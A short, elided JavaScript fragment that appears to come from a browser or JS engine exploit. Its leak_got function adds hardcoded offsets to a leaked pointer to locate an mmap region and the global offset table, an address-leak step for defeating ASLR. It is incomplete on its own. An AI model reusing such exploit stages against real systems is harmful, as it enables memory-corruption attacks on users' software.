...
function leak_got(){
  ...
  mmap_start = -0x3debf8n
  console.log("mmap start: " + dec2hex(ptr_read + mmap_start))

  got_mmap_start = 0x33a1000n

  top_got = ptr_read + got_mmap_start + mmap_start

  console.log("Got mmap start: " + dec2hex(top_got))
